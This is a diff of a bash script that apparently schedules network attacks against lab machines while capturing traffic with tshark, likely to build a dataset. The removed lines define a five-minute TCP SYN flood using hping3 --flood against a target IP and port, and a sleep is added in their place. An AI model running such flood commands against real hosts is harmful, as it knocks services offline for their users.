@@ -17,24 +17,13 @@ attack(){
     echo "$1 attack is finished" | ts "[%b %d %H:%M:%.S]" | tee -a $attack_procedure_log
 }
 
-#Define variables for attack 1
-attack_type="TCP_SYN_Flood"
-capture_file="/home/wiresharkTraces/SYN.pcap"
-traceroute_log="/home/logs/SYN_traceroute.log"
-attack_stats_log="/home/logs/SYN_stats.log"
-attack_log="/home/logs/SYN_attack.log"
-attack_duration=$((5*60)) # in seconds
-destination_ip=$machine13_ip
-destination_port=$machine13_port
-attack_script="hping3 --flood --frag -p "$destination_port" -S $destination_ip"
-
-attack $attack_type $capture_file $traceroute_log $attack_stats_log $attack_log $attack_duration $destination_ip $destination_port "$attack_script"
-
-
 #Write to file
 echo "Started break 1" | ts "[%b %d %H:%M:%.S]" | tee -a $attack_procedure_log
 #Start Wireshark capture
 tshark -i $interface -w "/home/wiresharkTraces/Break1.pcap" -F pcap & pid_tshark=$!
+#Dont participate in this attack
+sleep $((5*60)) # in seconds
+
 #Wait for next attack
 sleep $((15*60))
 #Stop the Wireshark capture
